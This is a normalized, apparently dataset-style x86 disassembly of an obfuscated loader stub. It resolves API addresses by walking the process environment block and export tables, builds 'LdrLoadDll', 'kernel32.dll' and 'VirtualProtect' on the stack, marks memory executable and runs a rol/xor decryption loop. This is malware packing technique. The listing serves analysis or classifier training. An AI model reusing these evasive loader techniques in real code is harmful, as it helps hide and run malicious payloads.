_start
pushad
xor esi esi
push esp
inc esi
add esp 0x4
mov ecx [ esp - 0x4 ]
and ebx ebx
adc esi 0x1
or ecx ecx
sbb ecx 0x4
inc esi
neg esi
call $+5
sub [ ecx ] esi
retn
sub_1460202d
xor ebx ebx
mov eax 0x0
add eax ebx
or ebx ebx
sbb ah 0x1
add ah 0xff
mov al ah
xor ebp ebp
add ebp ebx
call $+5
and esi 0x0
or esi [ esp ]
and esi esi
sbb ebp 0xffffffff
movzx edx [ esi + ebp - 0x2 ]
add esp 0xfffffffc
mov [ esp ] edx
test ecx ecx
sbb edx eax
pop edx
jne r-xdata
add [ esp ] ebx
jmp [ esp ]
mov ebx 0x0
or ebx ebp
sub_146020be
push [ fs : 0x0 ]
or esi esi
adc edx ecx
xor ebx ebx
or ebx 0xffff
not edi
add edx ecx
mov [ fs : 0x0 ] esp
and edx edi
and esi esi
adc edx ecx
jmp r-xdata
call $+5
add esp 0x4
mov esi [ esp - 0x4 ]
xor esi esi
add esi [ esp ]
mov [ fs : 0x0 ] esi
and ebx ebx
adc esp 0x8
xor ecx ecx
or ecx edx
xor esi esi
xor esi [ edx + 0x3c ]
test eax eax
adc edx esi
mov esi 0x4550
mov eax 0x0
xor eax [ edx ]
sub esp 0x4
mov [ esp ] eax
xor eax esi
pop eax
jne r-xdata
jmp [ esp ]
popad
mov eax 0x0
or eax 0x1
retn 0xc
and ecx ecx
mov esi 0x0
adc esi [ edx + 0x78 ]
and edx 0x0
or edx esi
test esi esi
adc edx ecx
sub esp 0x4
mov [ esp ] edx
xor esi esi
or esi [ edx + 0x20 ]
mov edx 0x0
add edx esi
and esi esi
adc edx ecx
push ecx
sub esp 0x4
mov [ esp ] edx
pop esi
pop ebx
call $+5
mov [ esp ] edx
xor edx [ esp ]
test esi esi
sbb esp 0xfffffffc
and eax 0x0
or eax esi
sub ecx ecx
add ecx [ esi ]
xor esi esi
or esi ecx
call $+5
xor ebp ebp
or ebp esp
add esi ebx
push 0x6c6c
sub esp 0x4
mov [ esp ] 0x4464616f
sub esp 0x4
mov [ esp ] 0x4c72644c
and edi 0x0
or edi esp
push 0xb
pop ecx
[ esi ] [ edi ]
je r-xdata
sub edx ecx
add esp 0xfffffffc
mov [ esp ] esi
xor esi [ esp ]
sub esp 0xfffffffc
mov esi [ edx ]
test edx edx
mov eax 0x0
adc eax 0x5a4d
and esi ebx
push eax
xor eax esi
pop eax
je r-xdata
mov esp 0x0
add esp ebp
pop esi
call $+5
mov [ esp ] ebx
sub esp 0x4
mov [ esp ] edx
add esp 0x4
mov edi [ esp - 0x4 ]
add esp 0x4
mov ecx [ esp - 0x4 ]
pop edx
sub ebx ebx
add ebx edx
mov esi 0x0
sub esi [ edx + 0x24 ]
neg esi
and edx 0x0
add edx esi
add edx ecx
xor esi esi
add esi [ edx + edi * 2 ]
and esi 0xffff
push esi
pop edi
xor esi esi
add esi [ ebx + 0x10 ]
sub edi esi
test ebx ebx
adc edi 0x1
mov edx 0x0
add edx [ ebx + 0x1c ]
or edi edi
adc edx ecx
xor esi esi
xor esi [ edx + edi * 4 ]
or ebx ebx
adc ecx esi
xor ebp ebp
add ebp esp
xor esi esi
push esi
and edx 0x0
or edx esp
call $+5
mov [ esp ] esi
call $+5
mov [ esp ] 0x6c006c
sub esp 0x4
mov [ esp ] 0x64002e
push 0x320033
push 0x6c0065
push 0x6e0072
push 0x65006b
push esp
push 0x1a0018
mov eax esp
call $+5
mov [ esp ] edx
sub esp 0x4
mov [ esp ] eax
push esi
sub esp 0x4
mov [ esp ] esi
push ecx
sub esp 0x4
mov [ esp ] edx
add esp 0x4
mov esi [ esp - 0x4 ]
pop ebx
call ebx
and eax 0x0
or eax [ esi ]
call $+5
mov [ esp ] eax
mov esi [ esp ]
add esp 0x4
and edi edi
mov eax 0x0
adc eax [ fs : 0x30 ]
and ecx 0x0
or ecx [ eax + 0x10 ]
mov [ ecx + 0x18 ] esi
mov esp 0x0
or esp ebp
and eax 0x0
add eax [ fs : 0x30 ]
xor ecx ecx
xor ecx [ eax + 0x10 ]
xor edx edx
add edx [ ecx + 0x18 ]
xor ecx ecx
add ecx edx
mov esi 0x0
add esi [ edx + 0x3c ]
or ecx ecx
adc edx esi
mov esi 0x0
sub esi [ edx + 0x78 ]
neg esi
mov edx esi
add edx ecx
add esp 0xfffffffc
mov [ esp ] edx
or esi esi
mov esi 0x0
adc esi [ edx + 0x20 ]
mov edx esi
or edi edi
adc edx ecx
sub esp 0x4
mov [ esp ] ecx
call $+5
mov [ esp ] edx
mov esi [ esp ]
add esp 0x4
pop ebx
sub esp 0x4
mov [ esp ] edx
xor edx [ esp ]
add esp 0x4
mov eax 0x0
sub eax esi
neg eax
xor ecx ecx
or ecx [ esi ]
and esi 0x0
add esi ecx
call $+5
push esp
pop ebp
add esi ebx
call $+5
mov [ esp ] 0x7463
sub esp 0x4
mov [ esp ] 0x65746f72
call $+5
mov [ esp ] 0x506c6175
sub esp 0x4
mov [ esp ] 0x74726956
mov edi 0x0
or edi esp
mov ecx 0x0
xor ecx 0xf
[ esi ] [ edi ]
je r-xdata
inc edx
add eax 0x4
mov esi 0x0
add esi [ eax ]
mov esp 0x0
or esp ebp
jmp [ esp ]
and esp 0x0
add esp ebp
add esp 0x4
mov esi [ esp - 0x4 ]
call $+5
mov [ esp ] ebx
push edx
mov edi [ esp ]
add esp 0x4
add esp 0x4
mov ecx [ esp - 0x4 ]
mov edx [ esp ]
add esp 0x4
and ecx ecx
mov ebx 0x0
adc ebx edx
xor esi esi
add esi [ edx + 0x24 ]
mov edx 0x0
xor edx esi
add edx ecx
mov esi [ edx + edi * 2 ]
and esi 0xffff
mov edi esi
push [ ebx + 0x10 ]
pop esi
sub edi esi
or edi edi
sbb edi 0xffffffff
mov edx 0x0
xor edx [ ebx + 0x1c ]
or ecx ecx
adc edx ecx
mov esi [ edx + edi * 4 ]
add ecx esi
mov ebx 0x0
or ebx 0x1000
call $+5
mov edx [ esp ]
add esp 0x4
and edx 0xfffff000
add edx ebx
add edx ebx
add esp 0xfffffffc
mov [ esp ] edx
push 0x4
pop eax
call $+5
add edx ebx
xor esi esi
add esi [ edx ]
add eax 0xffffffff
je r-xdata
sub edx 0xffffffff
add eax 0x4
xor esi esi
add esi [ eax ]
mov esp 0x0
add esp ebp
jmp [ esp ]
pop esi
pop edx
call $+5
mov [ esp ] esi
push esp
push 0x40
call $+5
mov [ esp ] 0x45d4
push edx
call $+5
mov [ esp ] ecx
sub esp 0x4
mov [ esp ] edx
pop esi
mov ebx [ esp ]
add esp 0x4
call $+5
pop eax
add eax 0x1b
call $+5
mov [ esp ] eax
add esp 0xfffffffc
mov [ esp ] ebp
sub ebp ebp
add ebp esp
add ebx 0x5
jmp ebx
jmp [ esp ]
sub_146024f2
add esp 0x4
mov ebx [ esp - 0x4 ]
mov edi 0x0
or edi esi
mov eax 0xc
add edi eax
mov esi 0x0
sub esi edi
neg esi
mov ebp 0x0
add ebp edi
and ecx 0x0
or ecx 0x4532
and edx 0x0
or edx ecx
call $+5
or edx edx
adc esi 0x1
pop ecx
add ecx 0xffffffff
je r-xdata
stosb [ edi ]
mov eax [ esp ]
add esp 0x4
call ebp
add eax ebx
add ecx edx
popad
mov eax 0x0
or eax 0x1
retn 0xc
jmp [ esp ]
mov eax 0x0
add eax [ esi ]
rol al cl
xor eax edx
sub esp 0x4
mov [ esp ] ecx
and ecx 0x0
add ecx 0x40
cmp ebx ecx
je r-xdata
